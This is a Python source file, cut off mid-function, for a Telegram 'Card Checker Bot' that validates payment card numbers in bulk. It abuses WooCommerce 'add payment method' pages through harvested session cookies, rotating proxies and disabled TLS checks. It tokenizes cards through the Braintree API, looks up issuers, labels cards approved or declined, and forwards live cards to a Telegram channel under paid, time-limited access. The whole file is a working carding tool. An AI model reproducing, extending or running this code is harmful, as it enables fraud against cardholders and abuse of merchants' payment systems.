import requests
import re
import base64
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
import time
import json
from datetime import datetime, timedelta
import random
import urllib3
import sys
import io
import codecs
import os
import glob
import threading
import asyncio
from filelock import SoftFileLock
from functools import wraps
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters

# Import ppcp module for /pp command
sys.path.append(os.path.join(os.path.dirname(__file__), 'ppcp'))
import asyncio

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Admin user ID
ADMIN_ID = 7405188060

# Forward channel ID (set to None to disable forwarding, or use channel username like '@yourchannel' or channel ID like -1001234567890)
FORWARD_CHANNEL_ID = -1003865829143  # Replace with your channel ID or username

# User database file
USER_DB_FILE = 'users_db.json'
USER_DB_LOCK_FILE = 'users_db.json.lock'

# Channel ID for forwarding approved cards
CHANNEL_ID = None

# Pending approvals (thread-safe with lock)
pending_approvals = {}
pending_approvals_lock = threading.Lock()

# Rate limiting: user_id -> last_check_time
user_rate_limit = {}
user_rate_limit_lock = threading.Lock()
RATE_LIMIT_SECONDS = 1  # Minimum seconds between checks per user (1 second as requested)

# REMOVED: Global variables for resource selection (now using per-request local variables)
# This prevents conflicts when multiple users check cards simultaneously

# Add these lines right after the imports to properly handle Unicode output
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

def load_user_db():
    """Load user database from file with file locking for thread safety"""
    lock = SoftFileLock(USER_DB_LOCK_FILE, timeout=10)
    with lock:
        if os.path.exists(USER_DB_FILE):
            try:
                with open(USER_DB_FILE, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}

def save_user_db(db):
    """Save user database to file with file locking for thread safety"""
    lock = SoftFileLock(USER_DB_LOCK_FILE, timeout=10)
    with lock:
        with open(USER_DB_FILE, 'w') as f:
            json.dump(db, f, indent=2)

def is_user_approved(user_id):
    """Check if user is approved and access hasn't expired"""
    db = load_user_db()
    user_id_str = str(user_id)
    
    if user_id_str not in db:
        return False
    
    user_data = db[user_id_str]
    
    # Check if lifetime access
    if user_data.get('access_type') == 'lifetime':
        return True
    
    # Check if access has expired
    expiry_date = datetime.fromisoformat(user_data.get('expiry_date'))
    if datetime.now() > expiry_date:
        return False
    
    return True

def approve_user(user_id, duration_type):
    """Approve a user with specified duration"""
    db = load_user_db()
    user_id_str = str(user_id)
    
    if duration_type == 'lifetime':
        expiry_date = None
        access_type = 'lifetime'
    else:
        # Calculate expiry date
        if duration_type == '1day':
            expiry_date = datetime.now() + timedelta(days=1)
        elif duration_type == '1week':
            expiry_date = datetime.now() + timedelta(weeks=1)
        elif duration_type == '1month':
            expiry_date = datetime.now() + timedelta(days=30)
        else:
            return False
        
        access_type = duration_type
    
    db[user_id_str] = {
        'user_id': user_id,
        'approved_date': datetime.now().isoformat(),
        'expiry_date': expiry_date.isoformat() if expiry_date else None,
        'access_type': access_type
    }
    
    save_user_db(db)
    return True

def discover_site_folders():
    """Discover available site folders in the current directory"""
    try:
        # Find all directories that start with 'site_' or 'site'
        site_folders = []
        for item in os.listdir('.'):
            if os.path.isdir(item) and (item.startswith('site_') or item.startswith('site')):
                # Check if folder contains required files
                site_txt = os.path.join(item, 'site.txt')
                cookies_1 = os.path.join(item, 'cookies_1.txt')
                cookies_2 = os.path.join(item, 'cookies_2.txt')
                
                if os.path.exists(site_txt) and os.path.exists(cookies_1) and os.path.exists(cookies_2):
                    site_folders.append(item)
        
        return site_folders
    except Exception as e:
        print(f"Error discovering site folders: {str(e)}")
        return []

def select_random_site():
    """Select a random site folder from available sites (thread-safe)"""
    site_folders = discover_site_folders()
    if not site_folders:
        return '.'
    
    # Select random site folder (thread-safe random)
    selected_site = random.choice(site_folders)
    return selected_site

def discover_cookie_pairs(site_folder):
    """Discover available cookie pairs in the specified site folder (thread-safe)"""
    try:
        # Use specified site folder or current directory
        search_dir = site_folder if site_folder else '.'
        
        # Find all cookies_X-1.txt files
        pattern1 = os.path.join(search_dir, 'cookies_*-1.txt')
        pattern2 = os.path.join(search_dir, 'cookies_*-2.txt')
        
        files1 = glob.glob(pattern1)
        files2 = glob.glob(pattern2)
        
        # Extract the pair identifiers (e.g., "1" from "cookies_1-1.txt")
        pairs = []
        for file1 in files1:
            # Extract the pair number from filename like "cookies_1-1.txt"
            basename = os.path.basename(file1)
            pair_id = basename.replace('cookies_', '').replace('-1.txt', '')
            file2_expected = os.path.join(search_dir, f'cookies_{pair_id}-2.txt')
            
            if file2_expected in files2:
                pairs.append({
                    'id': pair_id,
                    'file1': file1,
                    'file2': file2_expected
                })
        
        return pairs
    except Exception as e:
        print(f"Error discovering cookie pairs: {str(e)}")
        return []

def select_random_cookie_pair(site_folder):
    """Select a random cookie pair from available pairs in the specified site folder (thread-safe)"""
    pairs = discover_cookie_pairs(site_folder)
    if not pairs:
        # Fallback to simple cookies_1.txt and cookies_2.txt
        search_dir = site_folder if site_folder else '.'
        file1 = os.path.join(search_dir, 'cookies_1.txt')
        file2 = os.path.join(search_dir, 'cookies_2.txt')
        return {'file1': file1, 'file2': file2, 'id': 'fallback'}
    
    # Select random pair (thread-safe random)
    selected_pair = random.choice(pairs)
    return selected_pair

def select_new_cookie_pair_silent(site_folder):
    """Select a new random cookie pair without printing (for each card check) (thread-safe)"""
    pairs = discover_cookie_pairs(site_folder)
    if not pairs:
        # Fallback to simple cookie files
        search_dir = site_folder if site_folder else '.'
        file1 = os.path.join(search_dir, 'cookies_1.txt')
        file2 = os.path.join(search_dir, 'cookies_2.txt')
        return {'file1': file1, 'file2': file2, 'id': 'fallback'}

    # Select random pair (thread-safe random)
    selected_pair = random.choice(pairs)
    return selected_pair

def select_random_proxy(site_folder):
    """Select a random proxy from proxy.txt in the specified site folder (thread-safe)"""
    try:
        search_dir = site_folder if site_folder else '.'
        proxy_file = os.path.join(search_dir, 'proxy.txt')
        
        # Check if proxy file exists
        if not os.path.exists(proxy_file):
            return None
        
        with open(proxy_file, 'r') as f:
            proxies = [line.strip() for line in f.readlines() if line.strip()]
            
            # Check if proxy file is empty
            if not proxies:
                return None
            
            # Select random proxy (thread-safe random)
            selected_proxy = random.choice(proxies)
            return selected_proxy
    except Exception as e:
        print(f"⚠️ Error selecting proxy: {str(e)}, proceeding without proxy")
        return None

def read_cookies_from_file(filename):
    """Read cookies from a specific file (thread-safe)"""
    try:
        with open(filename, 'r') as f:
            content = f.read()
            # Create a namespace dictionary for exec
            namespace = {}
            exec(content, namespace)
            return namespace['cookies']
    except Exception as e:
        print(f"Error reading {filename}: {str(e)}")
        return {}

# Read domain URL from site.txt in the specified site folder
def get_domain_url(site_folder):
    """Get domain URL from site.txt in the specified site folder (thread-safe)"""
    try:
        search_dir = site_folder if site_folder else '.'
        site_file = os.path.join(search_dir, 'site.txt')
        
        with open(site_file, 'r') as f:
            return f.read().strip()
    except Exception as e:
        print(f"Error reading site.txt: {str(e)}")
        return ""  # fallback

# Read cookies from the specified cookie pair
def get_cookies_1(cookie_pair):
    """Get cookies from first cookie file (thread-safe)"""
    return read_cookies_from_file(cookie_pair['file1'])

# Read cookies from the specified cookie pair
def get_cookies_2(cookie_pair):
    """Get cookies from second cookie file (thread-safe)"""
    return read_cookies_from_file(cookie_pair['file2'])

user = generate_user_agent()

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def get_headers(domain_url):
    """Get headers with specified domain URL (thread-safe)"""
    return {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'dnt': '1',
        'priority': 'u=0, i',
        'referer': f'{domain_url}/my-account/add-payment-method/',
        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }

def get_random_proxy(proxy_string):
    """Parse proxy string and return proxy dict (thread-safe)"""
    if not proxy_string:
        return None

    # Parse proxy string (format: host:port:username:password)
    parts = proxy_string.split(':')
    if len(parts) == 4:
        host, port, username, password = parts
        proxy_dict = {
            'http': f'http://{username}:{password}@{host}:{port}',
            'https': f'http://{username}:{password}@{host}:{port}'
        }
        return proxy_dict
    return None

def get_new_auth(site_folder, cookie_pair, proxy_string):
    """Get fresh authorization tokens (thread-safe)"""
    domain_url = get_domain_url(site_folder)  # Read fresh domain URL
    cookies_1 = get_cookies_1(cookie_pair)    # Read fresh cookies
    headers = get_headers(domain_url)         # Get headers with current domain
    
    proxy = get_random_proxy(proxy_string)
    response = requests.get(
        f'{domain_url}/my-account/add-payment-method/',
        cookies=cookies_1,
        headers=headers,
        proxies=proxy,
        verify=False
    )
    if response.status_code == 200:
        # Get add_nonce
        add_nonce = re.findall('name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
        if not add_nonce:
            print("Error: Nonce not found in response")
            return None, None, 'cookie_expired'

        # Get authorization token
        i0 = response.text.find('wc_braintree_client_token = ["')
        if i0 != -1:
            i1 = response.text.find('"]', i0)
            token = response.text[i0 + 30:i1]
            try:
                decoded_text = base64.b64decode(token).decode('utf-8')
                au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)
                if not au:
                    print("Error: Authorization fingerprint not found")
                    return None, None, 'cookie_expired'
                return add_nonce[0], au[0], None
            except Exception as e:
                print(f"Error decoding token: {str(e)}")
                return None, None, 'cookie_expired'
        else:
            print("Error: Client token not found in response")
            return None, None, 'cookie_expired'
    else:
        print(f"Error: Failed to fetch payment page, status code: {response.status_code}")
        return None, None, 'site_error'

def country_code_to_emoji(country_code):
    # Map of country codes to emojis for common countries
    country_emoji_map = {
        'PH': '🇵🇭',
        'US': '🇺🇸',
        'GB': '🇬🇧',
        'CA': '🇨🇦',
        'AU': '🇦🇺',
        'DE': '🇩🇪',
        'FR': '🇫🇷',
        'IN': '🇮🇳',
        'JP': '🇯🇵',
        'CN': '🇨🇳',
        'BR': '🇧🇷',
        'RU': '🇷🇺',
        'ZA': '🇿🇦',
        'NG': '🇳🇬',
        'MX': '🇲🇽',
        'IT': '🇮🇹',
        'ES': '🇪🇸',
        'NL': '🇳🇱',
        'SE': '🇸🇪',
        'CH': '🇨🇭',
        'KR': '🇰🇷',
        'SG': '🇸🇬',
        'NZ': '🇳🇿',
        'IE': '🇮🇪',
        'BE': '🇧🇪',
        'AT': '🇦🇹',
        'DK': '🇩🇰',
        'NO': '🇳🇴',
        'FI': '🇫🇮',
        'PL': '🇵🇱',
        'CZ': '🇨🇿',
        'PT': '🇵🇹',
        'GR': '🇬🇷',
        'HU': '🇭🇺',
        'RO': '🇷🇴',
        'TR': '🇹🇷',
        'IL': '🇮🇱',
        'AE': '🇦🇪',
        'SA': '🇸🇦',
        'EG': '🇪🇬',
        'AR': '🇦🇷',
        'CL': '🇨🇱',
        'CO': '🇨🇴',
        'PE': '🇵🇪',
        'VE': '🇻🇪',
        'TH': '🇹🇭',
        'MY': '🇲🇾',
        'ID': '🇮🇩',
        'VN': '🇻🇳',
    }
    if not country_code or len(country_code) != 2:
        return '🏳️'
    country_code = country_code.upper()
    return country_emoji_map.get(country_code, '🏳️')

def get_bin_info(bin_number):
    import time
    start_time = time.time()
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
        print(f"BIN Lookup HTTP Code: {response.status_code}")
        print(f"BIN Lookup Response: {response.text}")
        if response.status_code == 200 and response.text:
            data = response.json()
            if data:
                raw_type = (data.get('type') or data.get('card_type') or '').lower().strip()
                def normalizeCardType(t):
                    if 'debit' in t:
                        return 'DEBIT'
                    elif 'credit' in t:
                        return 'CREDIT'
                    else:
                        return 'UNKNOWN'
                def normalizeCardBrand(b):
                    if not b:
                        return 'UNKNOWN'
                    b = b.lower()
                    if 'visa' in b:
                        return 'VISA'
                    elif 'mastercard' in b or 'master' in b:
                        return 'MASTERCARD'
                    elif 'amex' in b or 'american express' in b:
                        return 'AMEX'
                    elif 'discover' in b:
                        return 'DISCOVER'
                    else:
                        return b.upper()
                country_code = None
                if isinstance(data.get('country'), dict):
                    country_code = data.get('country').get('alpha2') or data.get('country').get('code')
                else:
                    country_code = None
                print(f"DEBUG: Extracted country code: {country_code}")  # Debug print
                emoji_flag = country_code_to_emoji(country_code)
                print(f"DEBUG: Converted emoji flag: {emoji_flag}")  # Debug print
                result = {
                    'bin': bin_number,
                    'type': normalizeCardType(raw_type),
                    'brand': normalizeCardBrand(data.get('brand') or data.get('card_brand') or data.get('card') or ''),
                    'bank': data.get('bank', {}).get('name') if isinstance(data.get('bank'), dict) else (data.get('bank') or data.get('issuer') or data.get('bank_name') or 'N/A'),
                    'country': data.get('country', {}).get('name') if isinstance(data.get('country'), dict) else (data.get('country') or data.get('country_name') or 'N/A'),
                    'is_debit': 'debit' in raw_type,
                    'is_credit': 'credit' in raw_type,
                    'time_taken': f"{round(time.time() - start_time, 3)}s",
                    'card_level': data.get('card_level') or 'N/A'
                }
                for key, value in result.items():
                    if isinstance(value, str):
                        result[key] = value.strip() or 'N/A'
                return {
                    'brand': result['brand'],
                    'type': result['type'],
                    'level': result['card_level'],
                    'bank': result['bank'],
                    'country': result['country'],
                    'emoji': emoji_flag
                }
    except Exception as e:
        print(f"BIN lookup error: {str(e)}")
    return {
        'brand': 'UNKNOWN',
        'type': 'UNKNOWN',
        'level': 'UNKNOWN',
        'bank': 'UNKNOWN',
        'country': 'UNKNOWN',
        'emoji': '🏳️'
    }


def default_bin_info():
    return {
        'brand': 'UNKNOWN',
        'type': 'UNKNOWN',
        'level': 'UNKNOWN',
        'bank': 'UNKNOWN',
        'country': 'UNKNOWN',
        'emoji': '🏳️'
    }


def check_status(result):
    # First, check if the message contains "Reason:" and extract the specific reason
    if "Reason:" in result:
        # Extract everything after "Reason:"
        reason_part = result.split("Reason:", 1)[1].strip()

        # Check if it's one of the approved patterns
        approved_patterns = [
            'Nice! New payment method added',
            'Payment method successfully added.',
            'Insufficient Funds',
            'Gateway Rejected: avs',
            'Duplicate',
            'Payment method added successfully',
            'Invalid postal code or street address',
        ]

        cvv_patterns = [
            'CVV',
            'Gateway Rejected: avs_and_cvv',
            'Card Issuer Declined CVV',
            'Gateway Rejected: cvv'
        ]

        # Check if the extracted reason matches approved patterns
        for pattern in approved_patterns:
            if pattern in result:
                return "APPROVED", "Approved", True

        # Check if the extracted reason matches CVV patterns
        for pattern in cvv_patterns:
            if pattern in reason_part:
                return "APPROVED", "Approved", True

        # Return the extracted reason for declined cards
        return "DECLINED", reason_part, False

    # If "Reason:" is not found, use the original logic
    approved_patterns = [
        'Nice! New payment method added',
        'Payment method successfully added.',
        'Insufficient Funds',
        'Gateway Rejected: avs',
        'Duplicate',
        'Payment method added successfully',
        'Invalid postal code or street address',
        'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
    ]

    cvv_patterns = [
        'Reason: CVV',
        'Gateway Rejected: avs_and_cvv',
        'Card Issuer Declined CVV',
        'Gateway Rejected: cvv'
    ]

    for pattern in approved_patterns:
        if pattern in result:
            return "APPROVED", "Approved", True

    for pattern in cvv_patterns:
        if pattern in result:
            return "APPROVED", "Approved", True

    return "DECLINED", result, False

def normalize_card_format(card_input):
    """
    Normalize card format to number|mm|yy|cvv
    Supports:
    - 5401683112957490|10|2029|741 (pipe-separated)
    - 4284303806640816 0628 116 (space-separated with mmyy)
    """
    card_input = card_input.strip()
    
    # Check if already in pipe format
    if '|' in card_input:
        parts = card_input.split('|')
        if len(parts) == 4:
            number, mm, yy, cvv = parts
            # Normalize year to 4 digits
            if len(yy) == 2:
                yy = '20' + yy
            return f"{number}|{mm}|{yy}|{cvv}"
        return None
    
    # Handle space-separated format: number mmyy cvv
    parts = card_input.split()
    if len(parts) == 3:
        number, mmyy, cvv = parts
        if len(mmyy) == 4:
            mm = mmyy[:2]
            yy = '20' + mmyy[2:]
            return f"{number}|{mm}|{yy}|{cvv}"
    
    return None

def check_card(cc_line):
    """Check card with thread-safe resource selection"""
    from datetime import datetime
    start_time = time.time()

    try:
        # Select random site folder (thread-safe, per-request)
        site_folder = select_random_site()
        
        # Select new cookie pair for this card check (thread-safe, per-request)
        cookie_pair = select_new_cookie_pair_silent(site_folder)
        
        # Select random proxy (thread-safe, per-request)
        proxy_string = select_random_proxy(site_folder)
        
        # Get domain URL and cookies (thread-safe)
        domain_url = get_domain_url(site_folder)
        cookies_2 = get_cookies_2(cookie_pair)
        headers = get_headers(domain_url)
        
        # Get authorization (thread-safe)
        add_nonce, au, error_type = get_new_auth(site_folder, cookie_pair, proxy_string)
        if not add_nonce or not au:
            site_name = site_folder or "Unknown site"
            return "❌ Authorization failed. Try again later.", error_type, site_name

        # Parse card details with error handling
        try:
            parts = cc_line.strip().split('|')
            if len(parts) != 4:
                return "❌ Invalid card format. Expected: number|mm|yy|cvv", 'invalid_format', None
            n, mm, yy, cvc = parts
        except Exception as e:
            return f"❌ Error parsing card: {str(e)}", 'parse_error', None
        
        if not yy.startswith('20'):
            yy = '20' + yy

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'cc600ecf-f0e1-4316-ac29-7ad78aeafccd',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': '10080',
                            'streetAddress': '147 street',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        headers_token = {
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': user
        }

        proxy = get_random_proxy(proxy_string)
        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers_token,
            json=json_data,
            proxies=proxy,
            verify=False
        )

        if response.status_code != 200:
            site_name = site_folder or "Unknown site"
            return f"❌ Tokenization failed. Status: {response.status_code}", 'tokenization_error', site_name

        # Parse token with error handling
        try:
            response_data = response.json()
            token = response_data['data']['tokenizeCreditCard']['token']
        except (KeyError, ValueError) as e:
            site_name = site_folder or "Unknown site"
            return f"❌ Failed to extract token from response: {str(e)}", 'token_extraction_error', site_name

        headers_submit = headers.copy()
        headers_submit['content-type'] = 'application/x-www-form-urlencoded'

        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '{"correlation_id":"cc600ecf-f0e1-4316-ac29-7ad78aea"}',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        proxy = get_random_proxy(proxy_string)
        response = requests.post(
            f'{domain_url}/my-account/add-payment-method/',
            cookies=cookies_2,  # Use fresh cookies
            headers=headers,
            data=data,
            proxies=proxy,
            verify=False
        )

        elapsed_time = time.time() - start_time
        soup = BeautifulSoup(response.text, 'html.parser')
        error_div = soup.find('div', class_='woocommerce-notices-wrapper')
        message = error_div.get_text(strip=True) if error_div else "❌ Unknown error"

        status, reason, approved = check_status(message)
        bin_info = get_bin_info(n[:6]) or {}

        print(f"DEBUG: Emoji in response: {bin_info.get('emoji', '🏳️')}")  # Debug print emoji
        response_text = f"""
{status} {'❌' if not approved else '✅'}

𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {reason}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB
"""
        return response_text, None, None

    except Exception as e:
        return f"❌ Error: {str(e)}", None, None


async def check_ppcp_mass_cards(card_list, site_urls, max_concurrent=10):
    """Check multiple cards using async PPCP gateway with controlled concurrency"""
    try:
        from ppcp.async_ppcpgatewaycvv import check_multiple_cards
        results = await check_multiple_cards(card_list, site_urls, max_concurrent)
        return results
    except Exception as e:
        return [f"❌ Error in mass check: {str(e)}"] * len(card_list)


# ============= TELEGRAM BOT HANDLERS =============

async def forward_to_channel(context: ContextTypes.DEFAULT_TYPE, card_details: str, result: str):
    """Forward approved card to the configured channel"""
    if FORWARD_CHANNEL_ID is None:
        return  # Forwarding disabled

    try:
        # Check if the result indicates an approved card
        # For auth gateway: "APPROVED" and "✅"
        # For PPCP gateway: "CCN" or "CVV" with "✅"
        if ("APPROVED" in result and "✅" in result) or \
           ("CCN" in result and "✅" in result) or \
           ("CVV" in result and "✅" in result):
            # Send the result to the channel
            await context.bot.send_message(
                chat_id=FORWARD_CHANNEL_ID,
                text=result,
                parse_mode=None
            )
            print(f"✅ Forwarded approved card to channel: {FORWARD_CHANNEL_ID}")
    except Exception as e:
        print(f"❌ Error forwarding to channel: {str(e)}")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "User"
    
    welcome_message = f"""
👋 Welcome to the Card Checker Bot, @{username}!

🔐 To use this bot, you need admin approval.

📝 Your User ID: `{user_id}`

Please contact @TUMAOB to get access.

Commands:
/start - Show this message
/b3 <card> - Check a single card (Braintree Auth)
/b3s <cards> - Check multiple cards (Braintree Auth)
/pp <card/cards> - Check single or multiple cards (PPCP Gateway)

Single Card Examples:
/b3 5156123456789876|11|29|384
/pp 4315037547717888|10|28|852

Mass Check Examples:
/b3s 5401683112957490|10|2029|741
4386680119536105|01|2029|147
4284303806640816 0628 116

/pp 5401683112957490|10|2029|741
4386680119536105|01|2029|147
4000223361770415|04|2029|639

Supported formats:
- number|mm|yy|cvv
- number mmyy cvv
"""
    
    await update.message.reply_text(welcome_message, parse_mode='Markdown')

async def b3_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /b3 command for card checking with rate limiting"""
    user_id = update.effective_user.id

    # Check if user is admin
    if user_id == ADMIN_ID:
        pass  # Admin always has access
    elif not is_user_approved(user_id):
        await update.message.reply_text(
            "❌ You don't have access to use this bot.\n"
            f"Your User ID: `{user_id}`\n\n"
            "Please contact @TUMAOB for approval.",
            parse_mode='Markdown'
        )
        return

    # Rate limiting check (thread-safe)
    with user_rate_limit_lock:
        current_time = time.time()
        last_check_time = user_rate_limit.get(user_id, 0)
        time_since_last_check = current_time - last_check_time
        
        if time_since_last_check < RATE_LIMIT_SECONDS:
            wait_time = RATE_LIMIT_SECONDS - time_since_last_check
            await update.message.reply_text(
                f"⏳ Please wait {wait_time:.1f} seconds before checking another card.\n"
                "This prevents overloading the system."
            )
            return
        
        # Update last check time
        user_rate_limit[user_id] = current_time

    # Check if card details are provided
    if not context.args:
        await update.message.reply_text(
            "❌ Please provide card details.\n\n"
            "Format: /b3 number|mm|yy|cvv\n"
            "Example: /b3 5156123456789876|11|29|384"
        )
        return

    card_details = ' '.join(context.args)

    # Validate card format
    if card_details.count('|') != 3:
        await update.message.reply_text(
            "❌ Invalid card format.\n\n"
            "Format: /b3 number|mm|yy|cvv\n"
            "Example: /b3 5156123456789876|11|29|384"
        )
        return

    # Send "Checking Please Wait" message
    checking_msg = await update.message.reply_text("⏳ Checking Please Wait...")

    # Check the card
    result, error_type, site_name = check_card(card_details)

    # Edit the message with the result
    await checking_msg.edit_text(result)
    
    # Forward to channel if approved
    await forward_to_channel(context, card_details, result)

    # Handle error notifications
    if error_type:
        # Send message to admin
        admin_message = f"⚠️ Site Error Detected!\n\nSite: {site_name}\nError Type: {error_type}\nChecked by: @{update.effective_user.username or 'Unknown'} (ID: {user_id})\n\nPlease fix the issue."
        try:
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_message)
        except Exception as e:
            print(f"❌ Failed to send admin notification: {str(e)}")

        # Send message to user
        user_message = "ERROR"
        await update.message.reply_text(user_message)

    # Check if card is approved and forward to channel
    if CHANNEL_ID and "APPROVED" in result:
        try:
            # Extract card details for forwarding
            n, mm, yy, cvc = card_details.strip().split('|')
            masked_card = f"{n[:6]}xxxxxx{n[-4:]}|{mm}|{yy}|{cvc}"

            forward_message = f"""🎉 **APPROVED CARD DETECTED!**

𝗖𝗖 ⇾ `{masked_card}`
𝗚𝗮𝘁𝗲𝘄𝗮𝘺 ⇾ Braintree Auth

Checked by: @{update.effective_user.username or 'Unknown'} (ID: `{user_id}`)

#Approved #CC #Braintree"""

            await context.bot.send_message(
                chat_id=CHANNEL_ID,
                text=forward_message,
                parse_mode='Markdown'
            )
            print(f"✅ Approved card forwarded to channel: {CHANNEL_ID}")
        except Exception as e:
            print(f"❌ Failed to forward approved card to channel: {str(e)}")
            # Don't notify user about forwarding failure to avoid spam

async def b3s_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /b3s command for mass card checking"""
    user_id = update.effective_user.id
    is_admin = user_id == ADMIN_ID

    # Check if user is admin or approved
    if not is_admin and not is_user_approved(user_id):
        await update.message.reply_text(
            "❌ You don't have access to use this bot.\n"
            f"Your User ID: `{user_id}`\n\n"
            "Please contact @TUMAOB for approval.",
            parse_mode='Markdown'
        )
        return

    # Check if card details are provided
    if not context.args:
        await update.message.reply_text(
            "❌ Please provide card details.\n\n"
            "Format: /b3s <cards>\n"
            "Examples:\n"
            "/b3s 5401683112957490|10|2029|741\n"
            "4386680119536105|01|2029|147\n"
            "4284303806640816 0628 116\n\n"
            "You can send multiple cards, one per line."
        )
        return

    # Parse cards from message (support multiline input)
    message_text = update.message.text
    # Remove the /b3s command
    cards_text = message_text.replace('/b3s', '', 1).strip()

    # Split by newlines to get individual cards
    card_lines = [line.strip() for line in cards_text.split('\n') if line.strip()]

    if not card_lines:
        await update.message.reply_text(
            "❌ No valid cards found.\n\n"
            "Format: /b3s <cards>\n"
            "Examples:\n"
            "/b3s 5401683112957490|10|2029|741\n"
            "4386680119536105|01|2029|147\n"
            "4284303806640816 0628 116"
        )
        return

    # Normalize all cards
    normalized_cards = []
    for card_line in card_lines:
        normalized = normalize_card_format(card_line)
        if normalized:
            normalized_cards.append(normalized)
        else:
            await update.message.reply_text(
                f"❌ Invalid card format: {card_line}\n\n"
                "Supported formats:\n"
                "- number|mm|yy|cvv\n"
                "- number mmyy cvv"
            )
            return

    total_cards = len(normalized_cards)

    # Send initial status message
    status_msg = await update.message.reply_text(
        f"⏳ Checking {total_cards} card(s)...\n"
        f"Progress: 0/{total_cards}"
    )

    # Process each card
    approved_count = 0
    declined_count = 0

    for idx, card in enumerate(normalized_cards, 1):
        # Rate limiting for non-admin users (between cards in mass check)
        if not is_admin and idx > 1:
            with user_rate_limit_lock:
                current_time = time.time()
                last_check_time = user_rate_limit.get(user_id, 0)
                time_since_last_check = current_time - last_check_time

                if time_since_last_check < RATE_LIMIT_SECONDS:
                    wait_time = RATE_LIMIT_SECONDS - time_since_last_check
                    await asyncio.sleep(wait_time)

                # Update last check time
                user_rate_limit[user_id] = time.time()

        # Check the card
        result, error_type, site_name = check_card(card)

        # Count approved/declined
        if "APPROVED" in result and "✅" in result:
            approved_count += 1
            # Forward to channel if approved
            await forward_to_channel(context, card, result)
        else:
            declined_count += 1

        # Send result immediately after checking
        card_result = f"Card {idx}/{total_cards}:\n{result}"
        await update.message.reply_text(card_result)

        # Update progress every card
        try:
            await status_msg.edit_text(
                f"⏳ Checking {total_cards} card(s)...\n"
                f"Progress: {idx}/{total_cards}\n"
                f"✅ Approved: {approved_count} | ❌ Declined: {declined_count}"
            )
        except:
            pass  # Ignore edit errors (e.g., message not modified)

        # Handle error notifications
        if error_type:
            admin_message = f"⚠️ Site Error Detected!\n\nSite: {site_name}\nError Type: {error_type}\nChecked by: @{update.effective_user.username or 'Unknown'} (ID: {user_id})\n\nPlease fix the issue."
            try:
                await context.bot.send_message(chat_id=ADMIN_ID, text=admin_message)
            except Exception as e:
                print(f"❌ Failed to send admin notification: {str(e)}")

    # Send final summary
    summary = f"📊 Mass Check Complete\n\n"
    summary += f"Total Cards: {total_cards}\n"
    summary += f"✅ Approved: {approved_count}\n"
    summary += f"❌ Declined: {declined_count}"

    await update.message.reply_text(summary)

    # Delete the progress message
    try:
        await status_msg.delete()
    except:
        pass


async def pp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /pp command for ppcp gateway checking with rate limiting and mass checking support"""
    user_id = update.effective_user.id
    is_admin = user_id == ADMIN_ID

    # Check if user is admin or approved
    if not is_admin and not is_user_approved(user_id):
